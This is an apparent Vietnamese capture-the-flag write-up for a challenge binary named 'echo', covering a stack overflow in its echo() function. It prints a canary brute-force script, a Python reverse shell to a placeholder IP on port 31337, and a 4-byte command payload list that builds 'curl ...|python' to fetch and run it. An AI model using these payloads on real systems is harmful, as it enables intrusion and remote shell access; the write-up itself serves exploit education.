Đề cho t file **echo**</br>
![image](https://user-images.githubusercontent.com/23306492/40347441-7fa99dfe-5dca-11e8-9556-106b67a58c2d.png)</br>
 **enable** NX, canary</br>
![image](https://user-images.githubusercontent.com/23306492/40347475-a6df330c-5dca-11e8-9b4f-5e6e69d98fb8.png)</br>
Chương trình có 2 function chính : `fun()` nhập số luckynumber và `echo` nhâp  echo</br>
![image](https://user-images.githubusercontent.com/23306492/40347624-223ecf3a-5dcb-11e8-89f5-c7f42d267a8e.png)</br>
Trong hàm fun() `luckynumber = 0x0804B098`</br>
![image](https://user-images.githubusercontent.com/23306492/40347543-e06027f8-5dca-11e8-9330-e32dedb0bfdb.png)</br>
Trong hàm `echo()` </br> có lỗi stack overflow `n = recv(fd, &buf, 0x11Cu, 0);`. Vì buf nằm ở ebp-0x10c mà ta đọc tới 0x11c bytes lên buf</br>
![33085437_1701128753336171_1744560662744399872_n](https://user-images.githubusercontent.com/23306492/40372478-fb230364-5e0e-11e8-858f-5b8952d5237b.png)
</br>
Trước tiên thì ta cần `leak canary` sử dụng brute force. Tương tự như write up **codegate-prequels 2017 babypwn** [link](https://github.com/VulnHub/ctf-writeups/blob/master/2017/codegate-prequels/babypwn.md)
```
def leak_canary():
	canary = ""
	canary_offset = 0x100
	guess = 0x0
	buf = ""
	buf += "A" * canary_offset
	buf += canary
	while len(canary) < 4:
		while guess != 0xff:
			try:
				r = remote("localhost",12345)
				context.log_level = "critical"
				r.recvuntil("number: ")
				r.sendline(str(12345))
				r.recvuntil("Enter what you want to echo: ")
				r.send(buf + chr(guess))
				r.recvuntil("Bye bye!")
				print "Guessed correct byte:", format(guess, '02x')
				canary += chr(guess)
				buf += chr(guess)
				guess = 0x0
				r.close()
				break
			except EOFError,e:
				guess += 1
	return canary
```
![image](https://user-images.githubusercontent.com/23306492/40347714-6a405a24-5dcb-11e8-81db-a46cf987896a.png)</br>
Với bài này thì ta sử dụng system 4 byte để exploit. Tương tự như bài [babyfirst-revenge-v2 hitcon 2017](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py) và  [Reverse Shell python](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)</br>
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("xxx.xxx.xxx.xxx",31337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
```
payload = [
# generate "g> ht- sl" to file "v"
    '>dir', 
    '>sl', 
    '>g\>',
    '>ht-',
    '*>v',

    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',
    '*v>x',
    # generate "curl xxx.xxx.xxx.xxx|python;"
    '>\;\\', 
    '>on\\', 
    '>th\\', 
    '>py\\', 
    '>\|\\', 
    '>xx\\', 
    '>x\\', 
    '>x.\\', 
    '>xx\\', 
    '>x.\\', 
    '>xx\\', 
    '>x.\\', 
    '>xx\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 
    # got shell
    'sh x', 
    'sh g', 
]
```
[PAYLOAD](https://github.com/k4k4/SEATHON/blob/master/echo/echo.py)</br>
![echo](https://user-images.githubusercontent.com/23306492/40348447-f1fff918-5dcd-11e8-87e3-a77bbd71d930.png)
